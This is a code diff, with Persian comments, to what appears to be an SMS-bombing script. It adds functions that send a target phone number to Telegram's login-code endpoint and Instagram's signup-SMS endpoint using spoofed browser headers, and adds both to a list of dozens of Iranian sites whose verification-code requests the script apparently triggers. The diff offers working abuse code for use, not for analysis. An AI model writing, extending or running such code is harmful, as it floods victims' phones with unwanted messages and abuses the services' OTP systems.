@@ -67,6 +67,86 @@ def send_service_safe(service, phone):
 # ==========================
 
 
+def telegram_send(phone):
+    try:
+        # ایجاد یک session جدید
+        session = requests.Session()
+        
+        # درخواست اولیه برای ارسال کد
+        api_url = "https://my.telegram.org/auth/send_password"
+        
+        # داده‌های مورد نیاز
+        data = {
+            'phone': phone
+        }
+        
+        # هدرها
+        headers = {
+            'User-Agent': random.choice(user_agents),
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Origin': 'https://my.telegram.org',
+            'Referer': 'https://my.telegram.org/auth',
+        }
+        
+        # ارسال درخواست
+        response = session.post(api_url, data=data, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            return True
+        else:
+            print(f"{r}[!] تلگرام: خطا - کد وضعیت {response.status_code}{a}")
+            return False
+            
+    except Exception as e:
+        print(f"{r}[!] تلگرام: خطا - {e}{a}")
+        return False
+
+# تابع برای دریافت کد اینستاگرام
+def instagram_send(phone):
+    try:
+        # ایجاد session
+        session = requests.Session()
+        
+        # دریافت CSRF token
+        login_page = session.get('https://www.instagram.com/accounts/login/')
+        csrf_token = login_page.cookies.get('csrftoken')
+        
+        # داده‌های درخواست
+        data = {
+            'phone_number': phone,
+            'client_id': session.cookies.get('csrftoken'),
+            'seamless_login_enabled': '1',
+            'tos_version': 'row',
+            'opt_into_one_tap': 'false'
+        }
+        
+        # هدرها
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
+            'X-CSRFToken': csrf_token,
+            'X-Instagram-AJAX': '1',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Referer': 'https://www.instagram.com/accounts/login/',
+        }
+        
+        # ارسال درخواست
+        response = session.post('https://www.instagram.com/accounts/send_signup_sms_code/',
+                              data=data, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            return True
+        else:
+            print(f"{r}[!] اینستاگرام: خطا - کد وضعیت {response.status_code}{a}")
+            return False
+            
+    except Exception as e:
+        print(f"{r}[!] اینستاگرام: خطا - {e}{a}")
+        return False
+        
+
 def sibbank(phone):
     try:
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
@@ -2790,11 +2870,11 @@ def iranhotel(phone):
 services = [
     achareh, alibaba, alldigitall, alopeyk_safir, angeliran, Balad, banimode, barghman, Besparto, bimebazar,
     bodoroj, candom_shop, Charsooq, dastakht, dgshahr, digikala, DigikalaJet, divar, drnext, drto,
-    elanza, gap, gapfilm, ghasedak24, hajamooo, harikashop, ilozi, iranhotel, katonikhan, katoonistore,
+    elanza, gap, gapfilm, ghasedak24, hajamooo, harikashop, ilozi, iranhotel, instagram_send, katonikhan, katoonistore,
     komodaa, Koohshid, mahabadperfume, malltina, masterkala, mek, missomister, mo7_ir, mobilex, mootanroo,
     mrbilit, niktakala, Okala, okorosh, otaghak, paklean_call, payonshoes, pindo, pinket, ragham_call,
     riiha, Sandalestan, ShahreSandal, shahrfarsh, sibapp, sibbank, smarket, snapp, snappshop, tapsi,
-    tapsi_food, tebinja, tetherland, theshoes, torobpay, trip, trip_call, virgool, vitrin_shop
+    tapsi_food, tebinja, tetherland, theshoes, torobpay, trip, trip_call, virgool, vitrin_shop, telegram_send
 ]
 
 
